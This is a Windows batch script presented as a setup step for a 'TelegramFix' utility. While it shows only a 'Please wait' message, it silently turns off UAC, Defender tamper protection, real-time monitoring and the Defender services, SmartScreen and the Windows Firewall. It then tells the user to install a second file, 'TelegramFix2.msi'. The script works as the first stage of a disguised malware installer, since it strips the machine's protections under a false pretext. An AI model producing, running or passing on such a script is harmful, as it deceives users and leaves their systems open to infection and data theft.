@echo off
title Setup - TelegramFix_1
echo =========================================
echo   Setup - TelegramFix_1
echo =========================================
echo.
echo Please wait...

:: 1. Disable UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

:: 2. Disable Tamper Protection
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1

:: 3. Disable real-time protection via registry
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1

:: 4. Disable Defender via policy (persistent)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1

:: 5. Stop and disable Defender services
sc stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1

sc stop WdNisSvc >nul 2>&1
sc config WdNisSvc start= disabled >nul 2>&1

:: 6. Disable SmartScreen
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1

:: 7. Disable Windows Firewall
netsh advfirewall set allprofiles state off >nul 2>&1

echo.
echo Setup completed. You can now install TelegramFix2.msi
pause